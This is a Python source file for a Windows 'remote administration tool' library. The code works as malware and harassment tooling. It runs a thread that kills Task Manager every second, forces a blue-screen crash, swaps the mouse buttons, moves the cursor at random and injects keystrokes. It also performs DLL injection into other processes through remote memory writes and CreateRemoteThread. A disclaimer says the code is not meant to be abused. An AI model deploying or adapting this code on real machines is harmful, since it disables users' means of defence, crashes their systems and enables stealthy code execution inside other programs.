"""
	Pyrovalerone
	Python-based Windows Remote Administration Tool API
	Note: This code is not intended to be abused
"""
#!/usr/bin/env python3
import os
import sys
import struct
import logging
import threading
from random import randrange
import time
from WinRATCore.constants import *
from WinRATCore.structures import *
import WinRATCore.kernel32api as kernel32api
import WinRATCore.psapi as psapi


def keyboard(code, flags=0):
	return INPUT(INPUT_KEYBOARD, (KEYBDINPUT(code, 0, flags, 0, None)))

"""
	@method AntiTaskMGRRoutine
	@brief Thread to kill the taskmanager if its open
"""
def AntiTaskMGRRoutine():

	try:
		count = 32

		# Run forever, as we're in a thread recursion isn't advisable
		while True:

			#print("AntiTaskMGR: Enter taskmgr kill loop", flush=True)
			# Enumerate running processes until we have the complete list
			while True:

				procIds = (DWORD*count)()
				cb = ctypes.sizeof(procIds)
				bytesRet = DWORD()

				#print("AntiTaskMGR: Enter process enumeration loop", flush=True)			
				if psapi.EnumProcesses(ctypes.byref(procIds), cb, ctypes.byref(bytesRet)):
					
					if bytesRet.value < cb:
						#print("AntiTaskMGR: Process enumeration complete", flush=True)
						break # We're done

					# More processes, keep enumerating
					else:
						count *= 2

				# Process eumeration failed
				else:
					#print("AntiTaskMGR: Call to EnumProcesses failed", flush=True)
					break

			#print("AntiTaskMGR: Iterating proclist...", flush=True)
			# For every process id in the list
			for i in range(bytesRet.value // ctypes.sizeof(DWORD)):
				
				# Open the process for termination
				pid = procIds[i]
				#print("AntiTaskMGR: ProcWithPid -> %lu" % pid, flush=True)
				proc = kernel32api.OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, pid)

				# If the process was opened
				if proc:
					
					# Retrieve its name
					imgFileName = (ctypes.c_char * MAX_PATH)()
					if psapi.GetProcessImageFileName(proc, imgFileName, MAX_PATH) > 0:
						filename = os.path.basename(imgFileName.value.decode('ascii')) # Get filename without path
						
						# If it is the task manager kill it
						if filename == "Taskmgr.exe":
							kernel32api.TerminateProcess(proc, 1)
							print("No taskmgr for you!", flush=True)
						else:
							print(filename)

					# Close the handle to the process
					kernel32api.CloseHandle(proc)



			# Wait a second before looking again
			time.sleep(1)
	except Exception as exc:
		print(exc)

class WinRAT:

	def __init__(self):
		self.keylogThread = None
		self.antiTaskmgrThread = None

	"""
		@method antiTaskmgr
		@brief Function to start / stop preventing taskmgr
		@param state {int} 0=stop, 1=start
	"""
	def antiTaskmgr(self, start=1):

		if start == 1:
			self.antiTaskmgrThread = threading.Thread(target=AntiTaskMGRRoutine)
			self.antiTaskmgrThread.start()

	"""
		@method cdtray
		@brief Function to open / close the CD/DVD tray
		@param state {int} 0 will open the tray, 1 will close it
	"""
	def cdtray(self, state=0):
		if state == 0:
			ctypes.windll.WINMM.mciSendStringW(u"open L: type CDAudio alias L_drive", None, 0, None)
			ctypes.windll.WINMM.mciSendStringW(u"set L_drive door open", None, 0, None)
		else:
			ctypes.windll.WINMM.mciSendStringW(u"open L: type CDAudio alias L_drive", None, 0, None)
			ctypes.windll.WINMM.mciSendStringW(u"set L_drive door closed", None, 0, None)

	"""
		@method mousepos
		@brief Function to get or change the position of the cursor pointer
		@param x {int} position on the X-axis
		@param y {int} position on the Y-axis
	"""
	def mousepos(self, x=None, y=None):

		# GET
		if not x and not y:
			pt = POINT()
			try:
				ctypes.windll.user32.GetCursorPos(byref(pt)) # Get cursor position
			except Exception as exc:
				print("mousepos function unsupported, API has probably changed: %s " % exc.message)

			return {"x":pt.x, "y":pt.y}

		# SET
		else:
			try:
				ctypes.windll.user32.SetCursorPos(x, y) # Set cursor position
			except Exception as exc:
				print("mousepos function unsupported, API has probably changed: %s " % exc.message)
			

	"""
		@method msgbox
		@brief Function to display a pop up dialog messagebox
		@param title {string} Title of the popup
		@param msg {string} Body text of the message
	"""
	def msgbox(self, title="", msg="", style=MB_SERVICE_NOTIFICATION):
		ctypes.windll.user32.MessageBoxExW(0, msg, title, style)


	"""
		@method swapmouse
		@brief Function to annoy the user with a pop up
		@param evil {bool} true enables, false disables the ignorance
	"""
	def swapmouse(self, evil=1):
		ctypes.windll.user32.SwapMouseButton(evil)

	"""
		@method mousecircle
		@brief Function to annoy the user with random mouse movements
		@param cycles {int} number of cycles to run
		@param interval {int} number of milliseconds to wait before next cycle
	"""
	def mousecircle(self, cycles=1000, interval=500):
		res = self.screenres()
		for i in range(0, cycles):
			x = randrange(res[0])
			y = randrange(res[1])
			self.mousepos(x, y)
			time.sleep(interval/1000)

	def screenres(self):
		return [ctypes.windll.user32.GetSystemMetrics(0), ctypes.windll.user32.GetSystemMetrics(1)]


	def isAdmin(self):
		try:
			return ctypes.windll.shell32.IsUserAnAdmin()
		except:
			return False

	def runAsAdmin(self, cmd=""):
		try:
			ctypes.windll.shell32.ShellExecuteW(None, "runas", cmd, None, 1)
		except Exception as exc:
			self.msgbox(title="error", msg=str(exc), style=MB_SERVICE_NOTIFICATION|MB_ICONERROR)

	def SendInput(self, _input):
		return SendInput(1, ctypes.byref(_input), INPUT_LEN)

	def AutoTyper(self, keys=[], cycles=1):
		for cycle in range(0, cycles):
			for key in keys:
				self.SendInput(key)
			time.sleep(1)

	def RtlAdjustPrivilege(self, privilige_id, enable = True, thread_or_process = False):
		"""
		privilige_id: int
		"""
		_RtlAdjustPrivilege = ctypes.windll.ntdll.RtlAdjustPrivilege
		_RtlAdjustPrivilege.argtypes = [ULONG, BOOL, BOOL, ctypes.POINTER(BOOL)]
		_RtlAdjustPrivilege.restype  = ULONG

		CurrentThread = thread_or_process #enable for whole process
		Enabled = BOOL()

		status = _RtlAdjustPrivilege(privilige_id, enable, CurrentThread, ctypes.byref(Enabled))
		if status != 0:
			raise Exception(NtError(status))

		return True 


	def bsod(self):
		self.RtlAdjustPrivilege(SeShutdownPrivilege, True, False)
		response = (ctypes.c_ulong * 1)()
		ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, u"My name is Johnny Knoxville and welcome to jackass", None, 6, response);

	def beep(self, dwFreq:int, dwDuration:int):
		kernel32api.Beep(dwFreq, dwDuration)


	def playNote(self, note):

		name = note.split(":")[0]
		duration = 1
		if not len(note.split(":")) == 1:
			duration = int(note.split(":")[1])

		notes = dict()

		# Base octave
		notes["C0"] = 16
		notes["C#0"] = 17
		notes["D0"] = 18
		notes["D#0"] =19
		notes["E0"] = 21
		notes["F0"] = 22
		notes["F#0"] = 23
		notes["G0"] = 25
		notes["G#0"] = 26
		notes["A0"] = 28
		notes["A#0"] = 29
		notes["B0"] = 31

		# First octave
		notes["C1"] = 33
		notes["C#1"] = 35
		notes["D1"] = 37
		notes["D#1"] =39
		notes["E1"] = 41
		notes["F1"] = 44
		notes["F#1"] = 46
		notes["G1"] = 49
		notes["G#1"] = 52
		notes["A1"] = 55
		notes["A#0"] = 58
		notes["B1"] = 62

		# Second octave
		notes["C2"] = 65
		notes["C#2"] = 69
		notes["D2"] = 73
		notes["D#2"] =78
		notes["E2"] = 82
		notes["F2"] = 87
		notes["F#2"] = 93
		notes["G2"] = 98
		notes["G#2"] = 104
		notes["A2"] = 110
		notes["A#2"] = 117
		notes["B2"] = 123

		# Third octave
		notes["C3"] = 131
		notes["C#3"] = 139
		notes["D3"] = 147
		notes["D#3"] =156
		notes["E3"] = 165
		notes["F3"] = 175
		notes["F#3"] = 185
		notes["G3"] = 196
		notes["G#3"] = 208
		notes["A3"] = 220
		notes["A#3"] = 233
		notes["B3"] = 247

		# Fourth octave 
		notes["C4"] = 262
		notes["C#4"] = 277
		notes['D4'] = 294
		notes["D#4"] = 311
		notes['E4'] = 330
		notes['F4'] = 349
		notes['F#4'] = 370
		notes['G4'] = 392
		notes['G#4'] = 415
		notes['A4'] = 440
		notes['A#4'] = 466
		notes['B4']= 494

		if name not in notes.keys():
				return

		if name == ".":
			time.sleep( 0.125* duration)

		else:

			self.beep(dwFreq=notes[name],  dwDuration=125 * duration)

	def playNotes(self, notes):
		for note in notes:
			self.playNote(note)

	def injectdll(self, pid:int, dll:str) -> bool:

		# Get load adress of kernel32.dll
		k32Address = kernel32api.GetModuleHandleA(b'kernel32.dll')
		print("kernel32: "+hex(k32Address))

		# Get dynamic loader function adress
		llaAddress = kernel32api.GetProcAddress(k32Address, b'LoadLibraryA')
		
		
		print("LoadLibraryA: "+hex(llaAddress))

		# Get name of dll		
		dllName = dll.split("\\")[-1]

		# Get a control handle for the process
		proc = kernel32api.OpenProcess(PROCESS_ALL_ACCESS, 0, pid)
		if proc == 0:
			raise RuntimeError("Failed to attach to process\nMaybe process ID is incorrect!")
		print("Process handle:"+hex(proc))

		# Allocate dll path in remote process
		remoteDLLPath = kernel32api.VirtualAllocEx(proc, 0, len(dll), MEM_COMMIT, PAGE_READWRITE)
		if remoteDLLPath == 0:
			raise RuntimeError("Remote malloc() failed")

		print("Remote dll path: "+hex(remoteDLLPath))

		nWritten = SIZE_T(0)

		# Write dll path
		r = kernel32api.WriteProcessMemory(proc, remoteDLLPath, ctypes.create_string_buffer(dll.encode('utf-8')), len(dll), byref(nWritten))
		if r == 0:
			raise RuntimeError("Remote write() failed")

		# Check if it has been written
		checkBuf = ctypes.create_string_buffer(len(dll)) 
		nRead = SIZE_T(0)
		success = kernel32api.ReadProcessMemory(proc, remoteDLLPath, checkBuf, len(dll), byref(nRead))
		if checkBuf.raw.decode() == dll:
			print("Remote memory write successull!")
		else:
			raise RuntimeError("Failed writing memory currectly, memory corruption may occur!")

		# Creating remote Thread and call LoadLibraryA in remote process
		print("Attempting to load {}...".format(dllName))
		remoteThread = kernel32api.CreateRemoteThread(proc, LPVOID(0), DWORD(0), llaAddress, remoteDLLPath, DWORD(0), DWORD(0))
		if remoteThread == 0:
			raise RuntimeError("Remote thread call to LoadLibraryA failed.")

		print("Created remote thread: {}".format(remoteThread))

		# Wait for call completion
		ret = kernel32api.WaitForSingleObject(remoteThread, INFINITE)
		if ret == (WAIT_FAILED | WAIT_TIMEOUT | WAIT_OBJECT_0 | WAIT_ABANDONED):
			raise RuntimeError("Error waiting for LoadLibraryA in remote.")
		
		print("Probably loaded [code={}] {}! Will now verify...".format(ret, dllName))

		# Cleanup allocated remote memory
		ret = kernel32api.VirtualFreeEx(proc, remoteDLLPath, 0, MEM_RELEASE)
		remoteDLLPath = None

		var_modules = (LPVOID * 1024)()
		var_size = ctypes.c_ulong()
		dllFound = False

		# Iterate over remote dlls to verify it has been loaded
		r = kernel32api.EnumProcessModules(proc, ctypes.byref(var_modules), ctypes.sizeof(var_modules), ctypes.byref(var_size))
		if r > 0:

			for i in range(0, (var_size.value // ctypes.sizeof(HMODULE))):

				module = var_modules[i]

				if module == 0 or module == None:
					continue
				var_name = ctypes.create_string_buffer(b" " * 100,100)
				kernel32api.GetModuleFileNameExA(proc, module, var_name, ctypes.sizeof(var_name))
				nameval = '  DLL: '+var_name.raw.decode('ascii')
				if var_name.raw.decode('ascii') == dllName:
					dllFound = True
					nameval = ' --> ' + nameval[6::]

				print(nameval)
		print("")

		if dllFound:
			print("DLL injected successfully!")
			return True
		else:
			print("Failed to inject DLL")

		return False